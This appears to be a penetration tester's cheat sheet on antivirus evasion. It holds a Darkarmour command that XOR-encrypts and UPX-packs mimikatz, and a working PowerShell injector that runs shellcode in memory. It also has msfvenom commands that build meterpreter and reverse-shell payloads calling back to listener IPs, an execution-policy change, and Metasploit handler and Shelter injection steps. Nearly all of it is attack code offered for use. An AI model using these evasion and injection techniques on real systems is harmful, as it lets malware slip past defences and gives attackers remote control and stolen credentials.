### Darkarmour
https://github.com/bats3c/darkarmour  
python3 darkarmour.py -f /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -e xor -j -k darkbyte -l 500 -u -o /home/kali/Desktop/b_m.exe
```
 -f FILE, --file FILE  file to crypt, assumed as binary if not told otherwise
  -e ENCRYPT, --encrypt ENCRYPT
                        encryption algorithm to use (xor)
  -S SHELLCODE, --shellcode SHELLCODE
                        file contating the shellcode, needs to be in the
                        'msfvenom -f raw' style format
  -b, --binary          provide if file is a binary exe
  -d, --dll             use reflective dll injection to execute the binary
                        inside another process
  -u, --upx             pack the executable with upx
  -j, --jmp             use jmp based pe loader
  -r, --runpe           use runpe to load pe
  -s, --source          provide if the file is c source code
  -k KEY, --key KEY     key to encrypt with, randomly generated if not
                        supplied
  -l LOOP, --loop LOOP  number of levels of encryption
  -o OUTFILE, --outfile OUTFILE
                        name of outfile, if not provided then random filename
                        is assigned
```
### Remote Process Memory Injection
#### PowerShell In-Memory Injection
```
ps_bypass.ps1:
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = 
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = <place your shellcode here,no quotes here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt64()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };

ShellCode: 
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f powershell 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.86.133 LPORT=4444 -f powershell(shikata_ga_nai don't work here)

Powershell Execution Policy Config:
Get-ExecutionPolicy -Scope CurrentUser
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```
### Shelter
```
1. msfconsole:
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
show options
set LHOST ip
set LPORT port
set AutoRunScript post/windows/manage/migrate
exploit
2. Use shelter to inject msfpayload into exe
```
